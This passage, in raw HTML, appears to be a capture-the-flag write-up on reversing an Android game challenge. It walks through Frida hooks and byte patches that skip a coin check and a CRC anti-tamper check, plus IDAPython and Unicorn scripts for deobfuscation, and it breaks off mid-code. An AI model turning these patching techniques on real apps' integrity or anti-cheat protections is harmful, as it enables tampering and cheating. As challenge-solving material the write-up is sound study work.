function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">HookLibWithCallback</span>(<span class="string">&#x27;libil2cpp.so&#x27;</span>, <span class="title class_">DumpIL2CPP</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><p>then track the Colletcoin function found an auto-increment logic to patch got the first flag:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">TraverseModules</span><span class="params">(mode, &#123;name = <span class="string">&#x27;&#x27;</span>, name_array = []&#125;)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mode == <span class="string">&#x27;all&#x27;</span>) &#123;</span><br><span class="line">      <span class="type">var</span> <span class="variable">modules</span> <span class="operator">=</span> Process.enumerateModules();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; modules.length; i++) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">module</span> <span class="operator">=</span> modules[i];</span><br><span class="line">        <span class="comment">// LogModule(module);</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> modules;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == <span class="string">&#x27;single&#x27;</span>) &#123;</span><br><span class="line">      <span class="type">var</span> <span class="variable">module</span> <span class="operator">=</span> Process.getModuleByName(name);</span><br><span class="line">      LogModule(<span class="keyword">module</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">module</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == <span class="string">&#x27;multiple&#x27;</span>) &#123;</span><br><span class="line">      <span class="type">var</span> <span class="variable">modules</span> <span class="operator">=</span> Process.enumerateModules();</span><br><span class="line">      <span class="type">var</span> <span class="variable">target_modules</span> <span class="operator">=</span> [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; modules.length; i++) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">module</span> <span class="operator">=</span> modules[i];</span><br><span class="line">        <span class="keyword">if</span> (name_array.indexOf(<span class="keyword">module</span>.name) != -<span class="number">1</span>) &#123;</span><br><span class="line">          LogModule(<span class="keyword">module</span>);</span><br><span class="line">          target_modules.push(<span class="keyword">module</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> target_modules;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">function <span class="title function_">PatchIncrease</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">var</span> <span class="variable">libil2cpp</span> <span class="operator">=</span> TraverseModules(<span class="string">&#x27;single&#x27;</span>, &#123;name: <span class="string">&#x27;libil2cpp.so&#x27;</span>&#125;);</span><br><span class="line">  <span class="type">var</span> <span class="variable">insn</span> <span class="operator">=</span> libil2cpp.base.add(<span class="number">0x465674</span>);</span><br><span class="line">  console.log(<span class="string">&#x27;[+] Patching..&#x27;</span>);</span><br><span class="line">  Memory.protect(insn, <span class="number">4</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">  insn.writeByteArray([<span class="number">0x01</span>, <span class="number">0xA0</span>, <span class="number">0x0F</span>, <span class="number">0x11</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Step 3 : using fridail2cppdumper find the button:</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -H <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1234</span> -l <span class="string">&quot;_agent.js&quot;</span> -f <span class="string">&quot;com.com.sec2023.rocketmouse.mouse&quot;</span></span><br></pre></td></tr></table></figure><p><strong>Step 4:  Track the process found there is a BR jump to a defined offset 0x48 import at libsec2023.so, open the so file located function sub_31164 but hack detect</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_sub_31164</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libsec2023.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> addr=<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="string">&quot;0x31164&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> func =  <span class="keyword">new</span> <span class="title class_">NativePointer</span>(addr.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] hook &#x27;</span>+func.<span class="title function_">toString</span>())</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hook success&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>]);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retvalue is :&quot;</span>, retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;method onleave&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">hook_sub_35404</span>: hook_sub_35404</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So we use frida Stalker to print the process of so calling.</p><p>First use the following idaPython script to print out the addresses and names of all functions of <a href="http://libsec2023.so/">libsec2023.so</a>.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"> </span><br><span class="line">func_addr = []</span><br><span class="line">func_name = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> idautils.<span class="title class_">Functions</span>():</span><br><span class="line">    func_addr.<span class="title function_">append</span>(i)</span><br><span class="line">    func_name.<span class="title function_">append</span>(idc.<span class="title function_">get_func_name</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="attr">func_addr</span>:</span><br><span class="line">    <span class="title function_">print</span>(f<span class="string">&quot;&#123;hex(i)&#125;, &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="attr">func_name</span>:</span><br><span class="line">    <span class="title function_">print</span>(f<span class="string">&quot;\&quot;&#123;i&#125;\&quot;, &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Second Stalker switch on</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func_addr = [...] <span class="comment">// fill the value print in idapython</span></span><br><span class="line"><span class="keyword">var</span> func_name = [...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">soName = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(soName) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">is_can_hook</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">is_can_hook</span>) &#123;</span><br><span class="line">                    <span class="comment">//hook_sub_3530C();</span></span><br><span class="line">                    <span class="keyword">var</span> times = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libsec2023.so&quot;</span>);</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">pid</span> = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start Stalker!&quot;</span>);</span><br><span class="line">                    <span class="title class_">Stalker</span>.<span class="title function_">follow</span>(<span class="variable language_">this</span>.<span class="property">pid</span>,&#123;</span><br><span class="line">                        <span class="attr">events</span>:&#123;</span><br><span class="line">                            <span class="attr">call</span>:<span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">ret</span>:<span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">exec</span>:<span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">block</span>:<span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">compile</span>:<span class="literal">false</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="attr">onReceive</span>:<span class="keyword">function</span>(<span class="params">events</span>)&#123;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="attr">transform</span>: <span class="keyword">function</span> (<span class="params">iterator</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> instruction = iterator.<span class="title function_">next</span>();</span><br><span class="line">                            <span class="keyword">do</span>&#123;</span><br><span class="line">                                <span class="keyword">if</span> (func_addr.<span class="title function_">indexOf</span>(instruction.<span class="property">address</span> - <span class="variable language_">module</span>.<span class="property">base</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call&quot;</span> + times+ <span class="string">&quot;:&quot;</span> + func_name[func_addr.<span class="title function_">indexOf</span>(instruction.<span class="property">address</span> - <span class="variable language_">module</span>.<span class="property">base</span>)])</span><br><span class="line">                                    times=times+<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                iterator.<span class="title function_">keep</span>();</span><br><span class="line">                            &#125; <span class="keyword">while</span> ((instruction = iterator.<span class="title function_">next</span>()) !== <span class="literal">null</span>);</span><br><span class="line">                        &#125;,</span><br><span class="line"> </span><br><span class="line">                        <span class="attr">onCallSummary</span>:<span class="keyword">function</span>(<span class="params">summary</span>)&#123;</span><br><span class="line"> </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Stalker end!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_dlopen, <span class="string">&quot;libsec2023.so&quot;</span>)</span><br></pre></td></tr></table></figure><p>finally found crc detect function branch jump</p><p>.text:00000000000371D4                 CMP             W0, W8<br>.text:00000000000371D8                 MOV             W8, #0x28 ; ‘(‘<br>.text:00000000000371DC                 CSEL            X8, X8, X9, EQ</p><p><code>CSEL</code> is a branch structure instruction in arm, and the position of BR jump is determined by X8, so this assembly can change the program control flow.</p><p><code>CSEL X8, X8, X9, EQ</code> EQ stands for Equal, which is an equal condition. Its value is determined by the value obtained by comparing the latest CMP. For example, the condition judged here is <code>CMP W0, W8</code> .</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(W0 == W8)&#123;</span><br><span class="line">    X8 = X8</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    X8 = X9</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The difference between X8 and X9 is 0x10, and the modification of X8 will lead to changes in the control flow. In order to prevent the control flow from steering to the wrong branch and causing frida to force exit after injection, we can patch the assembly here and change <code>CSEL X8, X8, X9, EQ</code> to <code>CSEL X8, X8, X8, EQ</code>, which will be assembled <code>08 01 89 9A</code> is modified to <code>08 01 88 9A</code> .</p><p>frida MemoryWrite dynamic patch</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_31164</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libsec2023.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> addr=<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="string">&quot;0x31164&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> func =  <span class="keyword">new</span> <span class="title class_">NativePointer</span>(addr.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] hook &#x27;</span>+func.<span class="title function_">toString</span>())</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func, &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hook success&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>]);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retvalue is :&quot;</span>, retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;method onleave&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">anti_sec2023</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> currentApplication = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>();</span><br><span class="line">        <span class="keyword">var</span> libso = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libsec2023.so&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[name]:&quot;</span>, libso.<span class="property">name</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[base]:&quot;</span>, libso.<span class="property">base</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[size]:&quot;</span>, <span class="title function_">ptr</span>(libso.<span class="property">size</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[path]:&quot;</span>, libso.<span class="property">path</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">protect</span>(<span class="title function_">ptr</span>(libso.<span class="property">base</span>), libso.<span class="property">size</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">writeByteArray</span>(<span class="title function_">ptr</span>(libso.<span class="property">base</span>).<span class="title function_">add</span>(<span class="number">0x371DC</span>),[<span class="number">0x08</span>,<span class="number">0x01</span>,<span class="number">0x88</span>,<span class="number">0x9A</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">anti_sec2023</span>: anti_sec2023</span><br><span class="line"><span class="attr">hook_31164</span>: hook_31164</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>There are also a large number of fancy instructions in the form of CSEL-BR reg, which can prevent the function from being parsed normally by ida, and the next instruction will actually continue to be executed after br. There are also normal selection statements hidden in these fancy instructions. block, or skip a few statements. Remove CSEL-BR and CSET-BR structures :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CSEL_op1 = idc.print_operand(CSEL_addr, <span class="number">0</span>)</span><br><span class="line">CSEL_op2 = idc.print_operand(CSEL_addr, <span class="number">1</span>)</span><br><span class="line">CSEL_op2_val = -<span class="number">1</span></span><br><span class="line">CSEL_op3 = idc.print_operand(CSEL_addr, <span class="number">2</span>)</span><br><span class="line">CSEL_op3_val = -<span class="number">1</span></span><br><span class="line">CSEL_cond = idc.print_operand(CSEL_addr, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> jump_array_addr == -<span class="number">1</span>:</span><br><span class="line">    temp_addr = CSEL_addr</span><br><span class="line">    <span class="keyword">while</span> temp_addr &gt; text_seg.start_ea:</span><br><span class="line">         <span class="keyword">if</span> idc.print_insn_mnem(temp_addr) == <span class="string">&quot;ADRL&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> idc.print_operand(temp_addr, <span class="number">0</span>) == jump_array_reg:</span><br><span class="line">                jump_array_addr = idc.get_operand_value(temp_addr, <span class="number">1</span>)</span><br><span class="line">                nop_addr_array_temp.append(temp_addr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> idc.print_insn_mnem(temp_addr) == <span class="string">&quot;ADRP&quot;</span>:  </span><br><span class="line">            <span class="keyword">if</span> idc.print_operand(temp_addr, <span class="number">0</span>) == jump_array_reg:</span><br><span class="line">                jump_array_addr = idc.get_operand_value(temp_addr, <span class="number">1</span>)</span><br><span class="line">                nop_addr_array_temp.append(temp_addr)</span><br><span class="line">                <span class="keyword">while</span> temp_addr &lt; text_seg.end_ea:</span><br><span class="line">                    <span class="keyword">if</span> idc.print_insn_mnem(temp_addr) == <span class="string">&quot;ADD&quot;</span>:</span><br><span class="line">                        <span class="keyword">if</span> idc.print_operand(temp_addr, <span class="number">0</span>) == jump_array_reg:</span><br><span class="line">                            jump_array_addr += idc.get_operand_value(temp_addr, <span class="number">2</span>)</span><br><span class="line">                            nop_addr_array_temp.append(temp_addr)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    temp_addr = idc.next_head(temp_addr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        temp_addr = idc.prev_head(temp_addr)</span><br><span class="line"></span><br><span class="line">     </span><br></pre></td></tr></table></figure><p>Or Step 4: use unicorn to get rid of it <a href="https://github.com/mFallW1nd/deflat/blob/master/emu_utils.py">https://github.com/mFallW1nd/deflat/blob/master/emu_utils.py</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from emu_utils import *</span><br><span class="line">from unicorn import *</span><br><span class="line">from unicorn.arm64_const import *</span><br><span class="line"><span class="meta"># from ida_bytes import *</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">trace_back_insn_with_target</span><span class="params">(insn_queue, target_reg)</span>:</span><br><span class="line">    <span class="keyword">for</span> insn in insn_queue:</span><br><span class="line">        <span class="title function_">if</span> <span class="params">(target_reg in insn.op_str)</span>:</span><br><span class="line">            <span class="title function_">if</span> <span class="params">(insn.mnemonic == <span class="string">&#x27;add&#x27;</span>)</span>:</span><br><span class="line">                <span class="title function_">print</span><span class="params">(insn.mnemonic + <span class="string">&#x27;\t&#x27;</span> + insn.op_str)</span></span><br><span class="line">        <span class="title function_">if</span> <span class="params">(insn.mnemonic == <span class="string">&#x27;ldr&#x27;</span>)</span>:</span><br><span class="line">            <span class="title function_">print</span><span class="params">(insn.mnemonic + <span class="string">&#x27;\t&#x27;</span> + insn.op_str)</span></span><br><span class="line">        <span class="title function_">if</span> <span class="params">(insn.mnemonic == <span class="string">&#x27;csel&#x27;</span>)</span>:</span><br><span class="line">            <span class="title function_">print</span><span class="params">(insn.mnemonic + <span class="string">&#x27;\t&#x27;</span> + insn.op_str)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">log_hook</span><span class="params">(emu, addr, size, user_data)</span>:</span><br><span class="line">    disasm = get_disasm(emu, addr, size)</span><br><span class="line"> </span><br><span class="line">    print(hex(addr) + <span class="string">&#x27;\t&#x27;</span> + disasm.mnemonic + <span class="string">&#x27;\t&#x27;</span> + disasm.op_str)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">step_over_hook</span><span class="params">(emu, addr, size, none)</span>:</span><br><span class="line">    disasm = get_disasm(emu, addr, size)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (disasm.mnemonic == <span class="string">&#x27;bl&#x27;</span> or disasm.mnemonic == <span class="string">&#x27;blr&#x27;</span>):</span><br><span class="line">        emu.reg_write(UC_ARM64_REG_PC, addr + size)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (disasm.mnemonic == <span class="string">&#x27;ret&#x27;</span>):</span><br><span class="line">        print(<span class="string">&#x27;function returned&#x27;</span>)</span><br><span class="line">        emu.emu_stop()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0x3ac68</span>):</span><br><span class="line">        emu.reg_write(UC_ARM64_REG_W10, <span class="number">0xEECF7326</span>)</span><br></pre></td></tr></table></figure><p>S<strong>tep 5 : Reverse the  encrypt</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 